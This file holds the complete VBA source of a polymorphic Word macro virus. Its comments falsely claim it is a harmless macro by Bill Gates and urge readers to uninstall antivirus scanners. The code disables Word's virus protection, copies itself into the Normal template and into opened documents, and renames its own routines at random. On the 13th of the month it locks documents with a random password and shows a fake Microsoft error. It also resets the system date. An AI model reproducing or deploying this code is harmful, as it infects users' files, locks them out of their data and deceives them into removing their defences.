   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Thank you for using my new cool Macro! It was created by the same
   'author as the W97M/Giveme Macro. But this is much better, so if you
   'liked my previous Macro, I'm sure you gonna like this one too!
   '
   'Author: Bill Gates (he he, if you don't believe me, just send an
   'e-mail to askbill@microsoft.com).
   '
   'Some stupid anti-virus scanners may detect this Macro as a virus!
   'But this is NOT a virus! It's just a Macro that modifies documents
   'to make them better! If you have a stupid AV scanner that detects
   'this useful Macro, then your scanner is a Trojan Horse that tries
   'to remove useful code! You should immediately uninstall and stop
   'using it. Microsoft don't like people who create trojan horses that
   'destroys useful code!

   Sub AutoOpen()
   Dim Hey(1 To 8) As String
   On Error Resume Next

   With Application
       .EnableCancelKey = wdCancelDisabled
       With Options
           .VirusProtection = 8 - 8
           .SaveNormalPrompt = 7 - 7
           .ConfirmConversions = 5 - 5
           .SavePropertiesPrompt = 9 - 9
       End With
       .DisplayAlerts = wdAlertsNone
   End With

   WordBasic.DisableAutoMacros 0

   Set Doc1 = ActiveDocument
   Set Doc2 = Doc1.VBProject
   Set Doc3 = Doc2.VBComponents
   Set Doc4 = Doc3.Item(7 - 6)
   Set Doc5 = Doc4.CodeModule

   Set Dot1 = NormalTemplate
   Set Dot2 = Dot1.VBProject
   Set Dot3 = Dot2.VBComponents
   Set Dot4 = Dot3.Item(6 - 5)
   Set Dot5 = Dot4.CodeModule

   Doc = Doc5.CountOfLines
   Dot = Dot5.CountOfLines

   SetAttr "c:\sysboot.bin", vbNormal

   If Dot = 0 Then
       If Not GetAttr(NormalTemplate.FullName) = vbNormal And _
       Not GetAttr(NormalTemplate.FullName) = vbArchive + vbNormal Then
           SetAttr NormalTemplate.FullName, vbNormal
           If Dir(NormalTemplate.FullName) = "" Then Application.Quit Savechanges:=wdSaveChanges
           Application.Quit Savechanges:=wdDoNotSaveChanges
       End If

       Set host1 = NormalTemplate
       Set host2 = host1.VBProject
       Set host3 = host2.VBComponents
       Set host4 = host3.Item(8 - 7)
       Set host5 = host4.CodeModule

       Open "c:\sysboot.bin" For Output As #1

       For i = 1 To Doc
           If i = 16 Then
               Print #1, "Sub AutoClose()"
           ElseIf i = 161 Then
               Print #1, "Sub ViewVBCode()"
           ElseIf i = 165 Then
               Print #1, "Sub ToolsMacro()"
           ElseIf i = 169 Then
               Print #1, "Sub FileSaveAs()"
           ElseIf i = 188 Then
               Print #1, "Function Poly()"
           ElseIf i <= 229 Then
               Print #1, Doc5.Lines(i, 1)
           End If
       Next i

       Close #1
   End If

   If Doc = 0 Then
       If Not GetAttr(ActiveDocument.FullName) = vbNormal And _
       Not GetAttr(ActiveDocument.FullName) = vbArchive + vbNormal Then Exit Sub

       If Not ActiveDocument.SaveFormat = wdFormatDocument And _
       Not ActiveDocument.SaveFormat = wdFormatTemplate Then Exit Sub

       If Mid(ActiveDocument.Name, 1, 2) = "Do" And _
       Mid(ActiveDocument.Name, 4, 5) = "ument" Then Exit Sub

       Set host1 = ActiveDocument
       Set host2 = host1.VBProject
       Set host3 = host2.VBComponents
       Set host4 = host3.Item(1 - 0)
       Set host5 = host4.CodeModule

       x = 0

       For i = 1 To 8
           Randomize
           Hey(i) = Int(Rnd * 9) + 1
       Next i

       Open "c:\sysboot.bin" For Output As #1

       For i = 1 To Dot
           If i = 16 Then
               Print #1, "Sub AutoOpen()"
           ElseIf i = 23 Or i = 24 Or i = 25 Or i = 26 Then
               x = x + 1
               Print #1, Left(Dot5.Lines(i, 1), Len(Dot5.Lines(i, 1)) - 5) & Hey(x) & " - " & Hey(x)
           ElseIf i = 36 Or i = 42 Or i = 61 Or i = 98 Then
               x = x + 1
               Print #1, Left(Dot5.Lines(i, 1), Len(Dot5.Lines(i, 1)) - 7) & "(" & Hey(x) & " - " & Hey(x) - 1 & ")"
           ElseIf i = 161 Then
               Print #1, "Sub " & Poly & "()"
           ElseIf i = 165 Then
               Print #1, "Sub " & Poly & "()"
           ElseIf i = 169 Then
               Print #1, "Sub " & Poly & "()"
           ElseIf i = 188 Then
               Print #1, "Function " & Poly & "()"
           ElseIf i <= 229 Then
               Print #1, Dot5.Lines(i, 1)
           End If
       Next i

       Close #1
   End If

   If Dot > 0 And Doc > 0 Then GoTo NiceDay

   host5.AddFromFile ("c:\sysboot.bin")

   NiceDay:
   If Day(Now) = 13 And Dot <> 0 And Doc = 0 Then
       For i = 1 To 10
           Randomize
           One = Int(Rnd * 9) + 1
           Two = Two & One
       Next i

       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate, Password:=Trim(Two)

       If WeekDay(Now) = vbFriday Then
           MsgBox "It's Friday 13th! This is my lucky day, I hope it's yours too!", vbInformation, "Have A Nice Day!"
       Else
           MsgBox "Your document has been corrupted because of a bug in Word! Call Microsoft Customer Support, they can help you. When you call, tell them this Bug-ID Code (don't forget it!): " & Trim(Two), vbCritical, "Microsoft Word"
       End If
   ElseIf Dot <> 0 And Doc = 0 Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
   End If

   If Year(Now) >= 2000 Then Date = #1/1/1980#
   End Sub

   Sub zDZaoAmlno()
   'Have A Nice Day!
   End Sub

   Sub YUfUsFarAc()
   'Have A Nice Day!
   End Sub

   Sub mwjphMVJyB()
   On Error Resume Next

   If ActiveDocument.SaveFormat = wdFormatTemplate Then
       PreviousName = ActiveDocument.FullName
       ActiveDocument.Content.Copy
       ActiveDocument.Close

       Application.Documents.Add.Content.Paste
       ActiveDocument.Characters.Last.Copy
       ActiveDocument.Characters.Last.Delete
       ActiveDocument.SaveAs FileName:=PreviousName, FileFormat:=wdFormatDocument

       Application.ScreenRefresh
   End If

   Dialogs(wdDialogFileSaveAs).Show
   End Sub

   Function cTXxWDkliq()

   For i = 1 To 10
       Randomize
       Hmm = Int(Rnd * 26) + 1

       If Hmm = 1 Then HmmHmm = "Q"
       If Hmm = 2 Then HmmHmm = "W"
       If Hmm = 3 Then HmmHmm = "E"
       If Hmm = 4 Then HmmHmm = "R"
       If Hmm = 5 Then HmmHmm = "T"
       If Hmm = 6 Then HmmHmm = "Y"
       If Hmm = 7 Then HmmHmm = "U"
       If Hmm = 8 Then HmmHmm = "I"
       If Hmm = 9 Then HmmHmm = "O"
       If Hmm = 10 Then HmmHmm = "P"
       If Hmm = 11 Then HmmHmm = "A"
       If Hmm = 12 Then HmmHmm = "S"
       If Hmm = 13 Then HmmHmm = "D"
       If Hmm = 14 Then HmmHmm = "F"
       If Hmm = 15 Then HmmHmm = "G"
       If Hmm = 16 Then HmmHmm = "H"
       If Hmm = 17 Then HmmHmm = "J"
       If Hmm = 18 Then HmmHmm = "K"
       If Hmm = 19 Then HmmHmm = "L"
       If Hmm = 20 Then HmmHmm = "Z"
       If Hmm = 21 Then HmmHmm = "X"
       If Hmm = 22 Then HmmHmm = "C"
       If Hmm = 23 Then HmmHmm = "V"
       If Hmm = 24 Then HmmHmm = "B"
       If Hmm = 25 Then HmmHmm = "N"
       If Hmm = 26 Then HmmHmm = "M"

       Randomize
       HmmHmmHmm = Int(Rnd * 2)
       If HmmHmmHmm = 1 Then HmmHmm = LCase(HmmHmm)

       HmmHmmHmmHmm = HmmHmmHmmHmm & HmmHmm
   Next i

   Poly = HmmHmmHmmHmm
   End Function
